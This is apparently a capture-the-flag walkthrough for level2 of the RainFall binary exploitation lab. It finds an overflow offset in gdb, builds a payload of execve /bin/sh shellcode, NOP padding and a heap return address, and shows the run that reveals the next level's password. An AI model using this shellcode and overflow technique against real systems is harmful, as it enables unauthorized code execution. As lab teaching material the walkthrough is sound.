# Walkthrough

**Main** : 
make buffer overflow to launch a shell pogram, the idea is to exploit the heap because the stack it protected  
Filled the buffer then jump to the heap address to executed the shellcode
Try to copy a shellcode in the heap by writing it in the input prompt

  
*In x86 and x86-64 assembly, the `eax` register (or `rax` in x86-64) is commonly used to store return values from functions. 
When a function finishes executing, its return value is typically placed in the `eax` register (or `rax` in x86-64) before control is returned to the calling function.*

**simplified sequence of how a function call and return work:**

1.  The caller function pushes arguments onto the stack and then calls the callee function.
2.  The callee function executes and computes its result, which is stored in `eax` (or `rax` in x86-64).
3.  The callee function executes a `ret` instruction, which pops the return address from the stack and transfers control back to the caller.
4.  The caller function can then access the return value from the `eax` (or `rax`) register to use it as needed.

**Process**:  
>   Find the offset to write over the  `eip`  address (return address) :
>   Address of buffer
>   Payload

## Find Offset
```
level2@RainFall:~$ gdb ./level2 
...
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () ---> 80 in decimal
(gdb) 

````

0x37634136 = 80 in decimal


## Get the address the return address function 
The idea is to copy a shellcode in the heap by writing it in the allocated address of malloc on the return address.
```
(gdb) b strdup
Breakpoint 1 at 0x80483e0
(gdb) run
Starting program: /home/user/level2/level2 
step
step

Breakpoint 1, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers 
eax            0xbffff6cc	-1073744180
ecx            0xffffffff	-1

....

fs             0x0	0
gs             0x33	51
(gdb) n
Single stepping until exit from function strdup,
which has no line number information.
0x0804853d in p ()
(gdb) info registers 
eax            0x804a008	134520840

```

strdup return address =  0x804a008



## Payload


-   [Shell code](http://shell-storm.org/shellcode/files/shellcode-575.html) : 21 bytes
-   pad of nope data : 59 bytes
-   return address : 4 bytes


**1. Create Payload**
```
 python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload

```

**2. load payload** 
```

level2@RainFall:~$ cat /tmp/payload - | ./level2 
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
  cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```
